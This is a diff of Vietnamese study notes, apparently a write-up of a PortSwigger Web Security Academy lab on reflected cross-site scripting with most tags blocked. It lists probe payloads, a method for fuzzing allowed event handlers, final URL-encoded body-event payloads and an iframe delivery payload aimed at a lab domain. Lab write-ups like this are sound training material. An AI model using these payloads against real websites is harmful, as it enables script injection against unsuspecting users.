@@ -387,7 +387,45 @@ Log từ server của attker khi user reload lại trang product=1  => lấy đ�
 
 ## CROSS SITE SCRIPTING (XSS)
 
-- [ ] **28/4** — Reflected XSS into HTML context with most tags and attributes blocked
+###  Reflected XSS into HTML context with most tags and attributes blocked
+Để xác định các tag allow or deny 
+
+Có thể thử các payload sau để nhận về các phản hồi http
+
+```code
+<img src=1 onerror=alert(1)>
+
+"><svg><animatetransform onbegin=alert(1)>
+
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
+```
+Sau đó ta tiền hành fuzz ; lưu ý có thể fuzz tag tuy nhiên ở đây mình sẽ fuzz events 
+
+Đổi search thành 
+
+```code
+<body%20$$=1>
+```
+
+[Sau đó vào trang sau để cop các event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 
+
+![alt text](image-37.png)
+
+Có 1 vài tag trả về lỗi ; ta sẽ có url paylaod như sau 
+
+```code
+?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+hoặc 
+
+?search=%22%3E%3Cbody%20onpopstate=print()>
+```
+Đưa thẻ iframe vào and send to victim
+
+```code
+<iframe src="https://0ace00f5048b2f61800280f600a1003a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E%22%20onload=this.style.width=%27100px%27%3E" onload=this.style.width='100px'>
+```
+
 - [ ] **29/4** — Reflected XSS with some SVG markup allowed
 - [ ] **30/4** — Reflected XSS into HTML context with nothing encoded
 - [ ] **1/5** — Reflected XSS into HTML context with all tags blocked except custom ones
